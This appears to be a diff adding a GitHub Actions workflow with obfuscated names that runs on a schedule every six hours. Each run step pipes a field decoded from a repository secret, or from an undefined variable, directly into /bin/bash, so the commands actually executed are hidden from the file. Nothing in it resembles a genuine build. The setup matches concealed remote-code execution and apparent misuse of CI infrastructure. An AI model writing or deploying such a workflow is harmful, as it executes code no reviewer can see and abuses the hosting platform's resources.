@@ -1,0 +1,22 @@
+name: mengyinying8716
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: mengyinying8716
+        env:
+          kfq829: ${{ secrets.kfq829 }}
+        run: |
+          echo $kfq829 | jq -r .tjabh518 | /bin/bash
+          echo $filte45 | jq -r .qjjnn5 | /bin/bash
+          echo $kkvys133 | jq -r .xxsk8 | /bin/bash
+          echo $jsy80390 | jq -r .ybfm0243 | /bin/bash
+          echo $cfumy4 | jq -r .mfxsn9 | /bin/bash
+          echo $zr03 | jq -r .nuwyn7 | /bin/bash
+
